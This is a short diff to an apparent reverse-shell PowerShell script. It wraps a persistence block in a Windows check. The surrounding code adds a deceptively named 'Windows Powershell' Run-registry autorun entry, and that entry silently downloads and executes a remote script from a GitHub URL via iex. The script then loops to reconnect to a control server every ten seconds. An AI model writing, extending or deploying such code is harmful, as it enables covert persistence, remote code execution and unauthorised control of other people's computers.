@@ -7,7 +7,8 @@ $scriptURL = 'https://raw.githubusercontent.com/PhantomControl/ReversePowershell
 $autorunKeyName = "Windows Powershell"
 $autorunKeyVal = 'powershell -WindowStyle Hidden -nop -c "iex (New-Object Net.WebClient).DownloadString(''' + $scriptURL + ''')"'
 
-# Persist
+# Persist if the system is windows
+if ($IsWindows){
 
 $autoruns = Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
 if (-not $autoruns.$autorunKeyName) {
@@ -17,6 +18,9 @@ elseif($autoruns.$autorunKeyName -ne $autorunKeyVal) {
     Remove-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $autorunKeyName
     New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $autorunKeyName -Value $autorunKeyVal
 }
+}
+
+else {}
 
 while ($true) {
     # Try to connect to server every 10s
